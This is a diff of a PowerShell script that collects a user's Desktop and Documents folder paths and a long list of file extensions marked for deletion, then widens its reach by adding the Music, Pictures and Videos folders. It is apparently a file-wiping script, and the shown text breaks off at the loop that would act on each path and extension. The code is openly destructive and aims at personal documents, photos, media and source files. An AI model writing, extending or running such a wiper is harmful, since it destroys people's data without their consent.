@@ -1,8 +1,12 @@
 $desktopPath = [Environment]::GetFolderPath("Desktop")
 $documentsPath = [Environment]::GetFolderPath("MyDocuments")
+$musicPath = [Environment]::GetFolderPath("MyMusic")
+$picturesPath = [Environment]::GetFolderPath("MyPictures")
+$videosPath = [Environment]::GetFolderPath("MyVideos")
+
 $extensionsToDelete = @("exe", "json", "doc", "pdf", "wpd", "docx", "rtf", "tex", "odt", "jpg", "jpeg", "mp3", "rar", "vcd", "webp", "css", "html", "py", "php", "ico", "lnk", "mp4", "js", "bak", "xml", "zip", "bmp")
 
-$pathsToDelete = @($desktopPath, $documentsPath)
+$pathsToDelete = @($desktopPath, $documentsPath, $musicPath, $picturesPath, $videosPath)
 
 foreach ($path in $pathsToDelete) {
     foreach ($extension in $extensionsToDelete) {
